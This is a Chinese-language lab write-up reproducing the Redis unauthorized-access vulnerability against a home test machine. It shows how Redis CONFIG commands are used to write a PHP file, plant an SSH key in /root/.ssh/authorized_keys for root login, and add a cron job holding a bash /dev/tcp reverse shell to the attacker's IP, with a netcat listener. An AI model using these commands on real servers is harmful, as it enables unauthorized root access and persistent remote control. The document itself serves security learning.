---
title: redis未授权访问漏洞
description: ""
date: 2026-08-19T15:18:09+08:00
lastmod: 2026-08-19T15:18:23+08:00
draft: false
slug: MuvosL-2026-008
categories:
  - 漏洞复现
tags:
---
[[redis]]

影响版本 redis 2.x，3.x，4.x，5.x
# 1 原理
## 1.1 redis是什么
一个键值对数据库，基于内存，比较快。挡在像Mysql这类数据库前面分担压力的这么个东西
## 1.2 漏洞概述
未授权访问漏洞，是指在攻击者没有获取到登陆权限或者未授权的情况下，或者不需要输入密码或者其他验证手段，即可通过输入网站后台主页地址，或者其他不允许查看页面可进行直接访问，同时进行操作。

在未授权访问时，利用 Redis 提供的config 命令，可以进行写文件操作，攻击者可以成功将自己的ssh公钥写入目标服务器的 /root/.ssh 文件夹下的authotrized_keys 文件中，然后使用对应私钥利用ssh服务登录目标服务器

# 2 环境搭建
```
kali（攻击机）：192.168.0.4
ubuntu（安装redis）：192.168.0.13
```

```
下载Redis：wget http://download.redis.io/releases/redis-2.8.17.tar.gz
```
![[Pasted image 20251105130546.png]]
解压后进行编译
![[Pasted image 20251105130615.png]]
但是我这里是缺一些东西的，编译部分失败，没有出现redis-server和redis-cli
![[Pasted image 20251105130707.png]]![[Pasted image 20251105130731.png]]
安装了一些依赖后，用了这两条命令
![[Pasted image 20251105130902.png]]
```bash
清理之前的编译
make distclean

使用 libc 代替 jemalloc 重新编译
make MALLOC=libc
```
这下就有了
![[Pasted image 20251105131045.png]]
```bash
将redis-server和redis-cli拷贝到/usr/bin目录下：
cp redis-server /usr/bin
cp redis-cli /usr/bin
返回目录redis-2.8.17，将redis.conf拷贝到/etc/目录下：
cd ..
cp redis.conf  /etc/
使用/etc/目录下的reids.conf文件中的配置启动redis服务：
redis-server /etc/redis.conf 

```
![[Pasted image 20251105131129.png]]

```bash
redis-server - Redis 服务器

作用

- Redis 数据库的主服务程序
    
- 负责数据存储、内存管理和客户端连接
    
- 监听端口（默认6379）接收客户端请求
  
redis-cli - Redis 客户端

作用

- Redis 命令行接口工具
    
- 用于连接和管理 Redis 服务器
    
- 执行数据库操作和监控

```


# 3 复现
## 3.1 未授权访问
`redis-cli -h 192.168.0.13`

![[Pasted image 20251105131923.png]]

## 3.2 写入webshell
```bash
config set dir /tmp
config set dbfilename redis.php set webshell "<?php phpinfo(); ?>"
```
![[Pasted image 20251105132637.png]]
查看靶机，已经被写入文件
![[Pasted image 20251105132849.png]]
## 3.3 利用公私钥获取root权限，并进行ssh连接
`基于公钥登录连接`
`前面的命令是通过密码（私钥）登录，这样比较麻烦，因为每次登录我们都需要输入密码，因此我们可以选择 SSH 的公钥登录连接方式，省去输入密码的步骤。`

`公钥登录的原理，是先在本地机器上生成一对公钥和私钥，然后手动把公钥上传到远程服务器。这样每次登录时，远程主机会向用户发送一段随机字符串，而用户会用自己的私钥对这段随机字符串进行加密，然后把加密后的字符串发送给远程主机，远程主机会用用户的公钥对这段字符串进行解密，如果解密后的字符串和远程主机发送的随机字符串一致，那么就认为用户是合法的，允许登录。`

`只需要把私钥传给远程服务器，远程服务器就可以验证私钥是否是对应的公钥，如果是就允许登录，这样就不需要输入密码了。`

`SSH 支持多种用于身份验证密钥的公钥算法, 包括 RSA、DSA、ECDSA 和 ED25519 等，其中 RSA 算法是最常用的，因为它是 SSH 协议的默认算法，所以我们这里以 RSA 算法为例来生成密钥，并配置免密码远程连接。`

`ssh-keygen 是为 SSH 创建新的身份验证密钥对的工具。此类密钥对用于自动登录、单点登录和验证主机，常用参数定义如下:`

`-t 参数指定密钥类型`
`-b 参数指定密钥长度` 
**在靶机中创建ssh公钥存放目录（一般是/root/.ssh)**
![[Pasted image 20251105133039.png]]
可以看到这里是已经就有了
**在攻击机中生成ssh私钥和公钥，密码为空（直接无密码连接）：`ssh-keygen -t rsa`**
![[Pasted image 20251105133315.png]]
```bash

进入.ssh目录：cd .ssh/，将生成的公钥保存到1.txt：
(echo -e "\n\n";cat id_rsa.pub;echo -e "\n\n") > 1.txt


```
![[Pasted image 20251105133409.png]]
连接靶机redis，将刚刚生成的公钥1.txt写入redis
![[Pasted image 20251105162903.png]]


```bash
攻击机连接靶机redis：redis-cli -h 192.168.209.136

使用 config get dir 命令得到redis备份的路径，更改redis备份路径为ssh公钥存放目录（一般默认为/root/.ssh）并设置上传公钥的备份文件名字为authorized_keys：
config get dir
config set dir /root/.ssh
config set dbfilename "authorized_keys"
save

```

![[Pasted image 20251105164121.png]]
此时，ssh公钥已经成功写入了靶机，利用ssh免密登录到靶机
`ssh -i id_rsa root@192.168.0.13`

这里我遇到了一些问题
![[Pasted image 20251105164718.png]]
![[Pasted image 20251105164825.png]]
![[Pasted image 20251105164839.png]]
![[Pasted image 20251105164915.png]]
这里犯的错误就是环境并没有提前配置完善
想要进行ssh连接，首先要确认是否对方开启了这个服务，这个可以用nmap扫描端口来进行判断的
将ubuntu上装好ssh服务并开启后再尝试一下SSH连接
![[Pasted image 20251105165219.png]]

这下就可以了，并且上来就是root用户

![[Pasted image 20251105165356.png]]
## 3.4 反弹shell
在权限足够的情况下利用redis写入文件到计划任务目录下执行，并进行监听
set abc "\n\n\n* * * * * bash -i >& /dev/tcp/192.168.0.4/4444 0>&1\n\n\n"
![[Pasted image 20251105175401.png]]可以看到root已被添加至计划任务
![[Pasted image 20251105175445.png]]
监听 nc -lnvp 4444